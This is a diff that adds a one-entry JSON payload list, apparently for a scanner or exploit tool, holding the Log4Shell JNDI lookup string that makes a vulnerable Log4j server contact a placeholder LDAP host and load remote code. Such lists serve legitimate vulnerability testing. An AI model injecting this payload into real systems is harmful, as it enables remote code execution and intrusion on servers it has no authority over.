@@ -1,0 +1,3 @@
+[
+    {"id":"log4shell","payload":"${jndi:ldap://LHOST:LPORT/LPATH}"}
+]
